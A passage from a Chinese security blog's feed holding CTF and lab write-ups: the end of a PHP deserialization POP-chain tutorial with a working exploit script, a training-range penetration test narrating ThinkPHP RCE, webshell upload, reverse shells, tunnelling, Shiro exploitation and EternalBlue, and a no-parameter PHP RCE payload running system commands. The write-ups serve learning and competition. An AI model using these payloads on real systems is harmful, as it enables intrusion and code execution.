class="token property">p</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到，在<code>__get()</code>魔术方法中，p作为函数来使用，我们可以来实例化<code>Modifier</code>类，从而触发<code>__invoke()</code>方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">//当脚本尝试将对象调用为函数时触发</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>至此，我们已经找到了一个完整的POP链</p><p>然后就可以伪协议配合include来把flag读出来</p><p>exp如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"php://filter/convert.base64-encode/resource=flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token double-quoted-string string">"H3"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token single-quoted-string string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$h3</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$h3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/H3h3QAQ/img/main/images/image-20220309221119184.png" alt="image-20220309221119184"></p><p>将其base64解码后成功拿到flag</p><p><img src="https://raw.githubusercontent.com/H3h3QAQ/img/main/images/image-20220306204313641.png" alt="image-20220306204313641"></p><h3 id="3、真实环境下的POP链构造"><a href="#3、真实环境下的POP链构造" class="headerlink" title="3、真实环境下的POP链构造"></a>3、真实环境下的POP链构造</h3><p>这里选择了CVE-2019-9081 Laravel5.7 反序列化 RCE进行复现</p><p>对于初学者，我建议复现一下Thinkphp和Laravel几个反序列化洞</p><p>在复现的过程中跟着作者的思路，可以很好的体会一下POP链子构造的方法和技巧</p><p>因为之前已经复现过，并且在看雪发过文章了，这里就贴个链接QAQ</p><p><a href="https://bbs.pediy.com/thread-270904.htm">https://bbs.pediy.com/thread-270904.htm</a></p><h2 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h2><p>相信通过了本篇文章，对于对POP链构造的初学者，能够提供一个简单快速的入手方法</p><p>POP链构造在真实环境下经常要“跳来跳去”，这就对挖掘者的耐心和技巧是个非常大的考验，但是如果成功挖掘出一条链子后，感觉非常的爽～</p><p>而面对这些，就需要大家对于<code>魔术方法</code>掌握牢固，并且对于这种构造思想也要灵活运用，不能太过死板，而且在挖链子的过程中也会有一些小技巧，这些就需要大家自行收集了，本篇文章就不过多赘述咯</p><blockquote><p>参考链接：</p><p><a href="https://v0w.top/2020/03/05/unsearise-POP/#2-2-%E7%94%A8%E4%B8%80%E4%B8%AA%E5%AE%9E%E4%BE%8B%E8%AF%B4%E6%98%8E%E5%A6%82%E4%BD%95%E6%9E%84%E9%80%A0POP%E9%93%BE">https://v0w.top/2020/03/05/unsearise-POP/#2-2-%E7%94%A8%E4%B8%80%E4%B8%AA%E5%AE%9E%E4%BE%8B%E8%AF%B4%E6%98%8E%E5%A6%82%E4%BD%95%E6%9E%84%E9%80%A0POP%E9%93%BE</a></p><p><a href="http://h3geeker.top/posts/ae3250a1.html#toc-heading-2">http://h3geeker.top/posts/ae3250a1.html#toc-heading-2</a></p><p><a href="https://bbs.pediy.com/thread-270904.htm">https://bbs.pediy.com/thread-270904.htm</a></p><p><a href="https://www.sec-in.com/article/1094">https://www.sec-in.com/article/1094</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="学习" scheme="http://h3geeker.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="网络安全" scheme="http://h3geeker.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>【萌新向】渗透测试靶场考核</title>
    <link href="http://h3geeker.top/posts/27d77a69.html"/>
    <id>http://h3geeker.top/posts/27d77a69.html</id>
    <published>2022-01-10T02:03:16.000Z</published>
    <updated>2022-01-10T02:03:16.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>最近年末了，单位有了渗透的考核</p><p>对于我这个几乎没有玩过内网的同学简直是非常难过！</p><p>靶场搭建再了单位的一台Thinkpad上，但是！路由器经常会炸，在后面我会解释一下为啥提前说一下这个</p><p>由于时间短，我没有完成整个渗透的过程，就简单记录一下渗透学习</p><p>接下来说明一下整个靶场的拓扑</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">我们首先假装一下，该环境是在公网环境下有两个web服务一个域控两个域用户WEB1是给出来的：http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.8</span><span class="token number">.128</span><span class="token punctuation">:</span><span class="token number">8081</span><span class="token operator">/</span>剩下的我们逐步收集<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>WEB1为：<a href="http://192.168.8.128:8081/">http://192.168.8.128:8081/</a></p><p>访问发现web应用是tp框架 且版本为v5.0.x</p><p><img src="https://s2.loli.net/2021/12/31/KuzRTXbv34GHnew.png" alt="image-20211229112452038"></p><p>随便给一个指，造成debug看一下报错页面给没给版本号</p><p><img src="https://s2.loli.net/2021/12/31/aNU5JXbPWEolinA.png" alt="image-20211229112509904"></p><p>可以看到，该Think版本为V5.0.15，此时可以利用工具或者手测一下</p><p>经过测试存在ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞</p><p>随便上一个webshell并且用蚁剑连接一下，连接后可以看到还有其他的同事也上了一句话（我的马是H3.php,就是简单的一句话）</p><p><img src="https://s2.loli.net/2021/12/31/pecF7Gqs1nCukdV.png" alt="image-20211229112556342"></p><p>然后上传冰蝎木马（其实这一步有点多余了，我本来想要为了方便提权，和利用msf，但是发现这里并不需要特别高的权限）</p><p><img src="https://s2.loli.net/2021/12/31/dsOtXErg8hzH56K.png" alt="image-20211229112648710"></p><p>利用命令执行，反弹shell到自己的kali中，进行后渗透工作</p><p><img src="https://s2.loli.net/2021/12/31/M9FIqtiALDr2Uhz.png" alt="image-20211229133312435"></p><p>在这里成功反弹到了shell，接下来就可以继续信息收集</p><p><img src="https://s2.loli.net/2021/12/31/3VWRpKEayIBTiC9.png" alt="image-20211229133334700"></p><p>上传一个fscan 扫一下c段，发现了web2的服务，并且看到了web2的服务器有着双网卡，这里先放在这不动</p><p><img src="https://s2.loli.net/2021/12/31/vMSKyBgkLh3zcnV.png" alt="image-20211229145356072"></p><p>发现了不同段的ip扫一下，发现是不出网，frp带出来，发现是个Tomcat的样例界面，此时又陷入了僵局，因为在我的印象中这玩意没有啥利用的地方（这里服务器崩了一次，导致IP和我扫到的地方不一样，小问题）</p><p><img src="https://s2.loli.net/2021/12/31/GpeKw1AuFCMvWI6.png" alt="image-20211229162141356"></p><p>看到了445想打永恒之蓝打不通（这里忘记截屏了），随即扫一下目录看看有没有其他的东西</p><p>扫到了admin，访问一下</p><p><img src="https://s2.loli.net/2021/12/31/4kJ7ZH2QTDp3nP9.png" alt="image-20211229162841688"></p><p>大写的Shiro（Shiro和Log4j养活了大堆安全人员 滑稽脸.jpg）</p><p><img src="https://s2.loli.net/2021/12/31/VfObJL3aGInN5T7.png" alt="image-20211229162914694"></p><p>而且bp的插件直接给了key，这就不用问多说了把</p><p><img src="https://s2.loli.net/2021/12/31/G9qlM2sbKTUW1tN.png" alt="image-20211229163429167"></p><p>直接进行shiro_attack，干他！</p><p><img src="https://s2.loli.net/2021/12/31/CWao9qdzVFungBA.png" alt="image-20211229171920156"></p><p>查看网卡</p><pre class="line-numbers language-none"><code class="language-none">Windows IP 配置以太网适配器 Ethernet0:   连接特定的 DNS 后缀 . . . . . . . :    本地链接 IPv6 地址. . . . . . . . : fe80::c900:af0f:9fe0:d91c%13   IPv4 地址 . . . . . . . . . . . . : 192.168.251.112   子网掩码  . . . . . . . . . . . . : 255.255.254.0   默认网关. . . . . . . . . . . . . : 192.168.250.1以太网适配器 Ethernet1:   连接特定的 DNS 后缀 . . . . . . . :    本地链接 IPv6 地址. . . . . . . . : fe80::310a:8deb:67a7:832d%12   IPv4 地址 . . . . . . . . . . . . : 10.10.10.4   子网掩码  . . . . . . . . . . . . : 255.255.255.0   默认网关. . . . . . . . . . . . . : 隧道适配器 isatap.{B0A725AE-0F5A-475D-B790-B922E4F0ECBB}:   媒体状态  . . . . . . . . . . . . : 媒体已断开   连接特定的 DNS 后缀 . . . . . . . : 隧道适配器 isatap.{F5E4AD16-A6C6-4F43-B6C5-F927AEBD7A45}:   媒体状态  . . . . . . . . . . . . : 媒体已断开   连接特定的 DNS 后缀 . . . . . . . : <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>尝试注入内存马无效，可以利用cs上线</p><p>利用shiro RCE 加上cs的powershell 上线</p><p>成功将目标机器上线（你会发现这里的ip又变回同段了，因为实在是路由器遭不住那么多的穿透直接凉了，经过讨论把web2放开直接打）</p><p><img src="https://s2.loli.net/2021/12/31/dZUSVDFBoqH4sya.png" alt="image-20211230093546448"></p><p>看一下网卡</p><p><img src="https://s2.loli.net/2021/12/31/Tv593JGHhKDYpt8.png" alt="image-20211230101634382"></p><p>发现了不同A段的IP地址</p><p>fscan扫一下</p><p><img src="https://s2.loli.net/2021/12/31/L7q1CcvxPIeupRE.png" alt="image-20211230102853261"></p><pre class="line-numbers language-none"><code class="language-none">10.10.10.3:139 open10.10.10.4:139 open10.10.10.4:8080 open10.10.10.6:445 open10.10.10.3:445 open10.10.10.4:445 open10.10.10.6:139 open10.10.10.6:135 open10.10.10.3:135 open10.10.10.4:135 openNetInfo:[*]10.10.10.4   [-&gt;]Windows2012   [-&gt;]192.168.8.142   [-&gt;]10.10.10.4NetInfo:[*]10.10.10.6   [-&gt;]Windows2008   [-&gt;]10.10.10.6[*] WebTitle:http://10.10.10.4:8080    code:200 len:20     title:Apache Tomcat/8.5.73[*] 10.10.10.4           WORKGROUP\WINDOWS2012       Windows Server 2012 R2 Standard 9600NetInfo:[*]10.10.10.3   [-&gt;]Win7   [-&gt;]10.10.10.3[*] 10.10.10.6           HACK\WINDOWS2008       Windows Server 2008 R2 Standard 7601 Service Pack 1[+] 10.10.10.3MS17-010(Windows 7 Ultimate 7601 Service Pack 1)[*] 10.10.10.6  (Windows Server 2008 R2 Standard 7601 Service Pack 1)[*] 10.10.10.3           __MSBROWSE__\WIN7              Windows 7 Ultimate 7601 Service Pack 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>传一个nps，做内网穿透，带到自己主机里（这里也是自己想要学习一下nps，内网我很菜，基本上没打过）</p><p><img src="https://s2.loli.net/2021/12/31/YQmiajXG4h7Incz.png" alt="image-20211230133633439"></p><p>成功带出来了</p><p><img src="https://s2.loli.net/2021/12/31/23elZRNn7Tv6ykc.png" alt="image-20211230134527777"></p><p>回到上文的fscan扫描结果可以看到这里有一个Win7</p><p><img src="https://s2.loli.net/2021/12/31/mpCNzvc3RO1gruh.png" alt="image-20211230140459145"></p><p>而且445也是打开的（这我就太懂了）</p><p><img src="https://s2.loli.net/2021/12/31/b314BLiEuOSeVrl.png" alt="image-20211230140531905"></p><p>直接考虑永恒之蓝！</p><p><img src="https://s2.loli.net/2021/12/31/SjTLeO6fcKgaudx.png" alt="image-20211230144808472"></p><p>存在永恒之蓝漏洞，那还说啥了！干他！！！！</p><p><img src="https://s2.loli.net/2021/12/31/ofyajYrFidsQT4l.png" alt="image-20211231084029579"></p><p>可以看到，我这里打了tm的15次，换了各种版本的exp，但是都无法连接成功利用，此时已经快要下班了 233333</p><p>不出众望，在第30+次的时候</p><p>它蓝屏了。。。。。</p><p><img src="https://s2.loli.net/2021/12/31/slrgEB4CTJbA6n3.png" alt="image-20211231084226107"></p><p>然后我也就下班了，我的第一次渗透就到这里了，如果这个域用户成功打穿了，也许能有可能进行横移，拿域控（边看大师傅的blog，边问我师傅，我很菜2333），不过这次的渗透给了我很大的启发。</p><p>第一点、对于刚刚接触的同学们，一定要做好信息收集的工具，能够在信息收集的阶段在自己的脑袋里形成一幅拓扑图</p><p>第二点、要熟悉常见的渗透工具：msf、cs、nmap、fsacn等等</p><p>第三点、要对渗透常用CVE漏洞学会利用和提权手法，比如永恒之蓝</p><p>第四点、要会内网穿透和多层代理，这个很多师傅都写了文章可以学习学习</p><p>学习永无止境，要多练习，多思考，经验很有用，纸上谈学不如动手实践，对于我一个CTFer来说，内网的知识接触很少，但是在整个靶场的渗透途中，把每个步骤都细分，这样就有了很明确的目的，也就把一个大目标划分成小目标，按照步骤来，遇到不会的东东就去现场学习并且整理笔记，就会容易得多。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://h3geeker.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="渗透测试" scheme="http://h3geeker.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>长安“战疫”网络安全卫士守护赛 部分wp</title>
    <link href="http://h3geeker.top/posts/5b82dfff.html"/>
    <id>http://h3geeker.top/posts/5b82dfff.html</id>
    <published>2022-01-08T12:23:22.867Z</published>
    <updated>2022-01-08T12:43:34.195Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="八卦迷宫"><a href="#八卦迷宫" class="headerlink" title="八卦迷宫"></a>八卦迷宫</h3><p>折磨！！！！</p><p>cazy{zhanchangyangchangzhanyanghechangshanshananzhanyiyizhanyianyichanganyang}</p><h3 id="RCE-No-Para"><a href="#RCE-No-Para" class="headerlink" title="RCE_No_Para"></a>RCE_No_Para</h3><p>PHP无参数RCE</p><p>参考自：<a href="https://blog.csdn.net/qq_38154820/article/details/106329976">https://blog.csdn.net/qq_38154820/article/details/106329976</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token single-quoted-string string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>代码会将$_GET[‘code’]中满足正则/[^\W]+((?R)?)/的部分，替换为空，然后查看是否剩下的部分强等于,如果满足，则执行</p><p>第二层bypass</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/session|end|next|header|dir/i'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对几个关键词进行了过滤</p><p>发现end被过滤了</p><p>所以用array_rand()函数代替end()</p><p>payload为：</p><pre class="line-numbers language-none"><code class="language-none">/?code=eval(array_rand(current(get_defined_vars())));&amp;system("ls");<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/01/08/DJIfQdEVTiPzC7v.png"></p><p>发现了php</p><p>直接cat 即可</p><p><img src="https://s2.loli.net/2022/01/08/NnwUglGisVBe264.png"></p><h3 id="西安加油"><a href="#西安加油" class="headerlink" title="西安加油"></a>西安加油</h3><p>一到流量题</p><p>看了一下没发现什么</p><p>导出全部的http对象</p><p>发现了两个文件</p><p><img src="https://s2.loli.net/2022/01/08/WAntKrpksTbmM9d.png"></p><p>把两个txt文本的内容都放到CyberChef解码</p><p><img src="https://s2.loli.net/2022/01/08/cxMDX5sYupUayzk.png"></p><p><img src="https://s2.loli.net/2022/01/08/fsHTpdNxKIFvqEX.png"></p><p>看起来secret.txt是压缩包，推断压缩包中的内容就是图片</p><p>还原压缩包文件</p><p><img src="https://s2.loli.net/2022/01/08/RHc465huAxiWVrY.png"></p><p>按照提示的内容拼图</p><p><img src="https://s2.loli.net/2022/01/08/hesGt32oVQIiUqc.png"></p><p>flag： cazy{make_XiAN_great_Again} </p><h3 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro?"></a>Shiro?</h3><p>一开始以为是shiro</p><p>就利用shiro attack</p><p><img src="https://s2.loli.net/2022/01/08/BQAcfz9mqw4WNRS.png"></p><p>但是发现并能干什么，只能执行几个命令（这个莫名的jar也是很可疑）</p><p>此时我随便输入用户名密码 发现都是ok</p><p><img src="https://s2.loli.net/2022/01/08/QptC7ZIcwTjFEOK.png"></p><p>此时高度怀疑log4jRCE</p><p>然后尝试了一下反弹shell，发现有过滤，但是不知道什么过滤</p><p><img src="https://s2.loli.net/2022/01/08/2cOmrPCE1ST7dbt.png"></p><p>经过测试发现是<code>jndi</code>被过滤了，而且可以大小写绕过</p><p>直接Log4j干他！</p><p><img src="https://s2.loli.net/2022/01/08/P36gzBRG7li1eC4.png"></p><h3 id="朴实无华的取证"><a href="#朴实无华的取证" class="headerlink" title="朴实无华的取证"></a>朴实无华的取证</h3><p>确实朴实无华</p><p>文件名给了系统信息直接vol取证</p><p>先看一下内存里有什么文件 （贴一下经过我筛选的文件）</p><pre class="line-numbers language-none"><code class="language-none">0x0000000001b301c0      1      0 RW-r-- \Device\HarddiskVolume1\Documents and Settings\Administrator\桌面\我的日记.txt.txt0x0000000001b34f90      1      1 R--r-- \Device\HarddiskVolume1\Documents and Settings\Administrator\桌面\flag.zip0x0000000001e65028      1      0 R--rw- \Device\HarddiskVolume1\Documents and Settings\Administrator\桌面\flag.png<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>分别打开看一下</p><p>flag.png</p><p>一串意义不明的字符串以及出题人美画！</p><p><img src="https://s2.loli.net/2022/01/08/362KXUGQF7ZrLlR.png"></p><p>flag.zip</p><p><img src="https://s2.loli.net/2022/01/08/ZWKlEIropSTzvNb.png"></p><p>加密过的一个压缩包</p><p>我的日记.txt</p><p><img src="https://s2.loli.net/2022/01/08/ZjELcBiQx4Wegsw.png"></p><p>这里给了部分的加密脚本</p><p>图片中的字符串</p><pre class="line-numbers language-none"><code class="language-none">FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/01/08/hNyvTqMF9p65xSK.png"></p><p>凯撒了一下，发现有蹊跷在里面</p><p>此时我们可以判断这个加密是加密脚本+凯撒</p><p>剩下的就是测试找规律</p><p>贴一下exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]"</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token punctuation">[</span>a <span class="token keyword">for</span> a <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">]</span><span class="token keyword">for</span> a <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">str</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token comment">#fdcb{Xldq_zloo_fhuwdlqob_vxffhhg_lq_iljkwlqj_wkh_hslghplf}</span><span class="token keyword">for</span> a <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">str</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">&gt;=</span> <span class="token string">"d"</span> <span class="token keyword">and</span> <span class="token builtin">str</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token operator">&lt;=</span><span class="token string">"z"</span><span class="token punctuation">:</span>        <span class="token builtin">str</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> <span class="token builtin">str</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'a'</span><span class="token punctuation">:</span>        <span class="token builtin">str</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'x'</span>    <span class="token keyword">elif</span> <span class="token builtin">str</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'b'</span><span class="token punctuation">:</span>        <span class="token builtin">str</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'y'</span>    <span class="token keyword">elif</span> <span class="token builtin">str</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'c'</span><span class="token punctuation">:</span>        <span class="token builtin">str</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'z'</span>    <span class="token keyword">elif</span> <span class="token builtin">str</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'|'</span><span class="token punctuation">:</span>        <span class="token builtin">str</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"_"</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token comment">#cazy{Xian_will_certainly_succeed_in_fighting_the_epidemic}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/01/08/RcFXkqvoT1SJVCb.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="wp" scheme="http://h3geeker.top/categories/wp/"/>
    
    
    <category term="大赛wp" scheme="http://h3geeker.top/tags/%E5%A4%A7%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>2021SCTF-Loginme</title>
    <link href="http://h3geeker.top/posts/54f35dc.html"/>
    <id>http://h3geeker.top/posts/54f35dc.html</id>
    <published>2021-12-28T01:32:57.167Z</published>
    <updated>2021-12-28T01:47:08.363Z</updated>
    
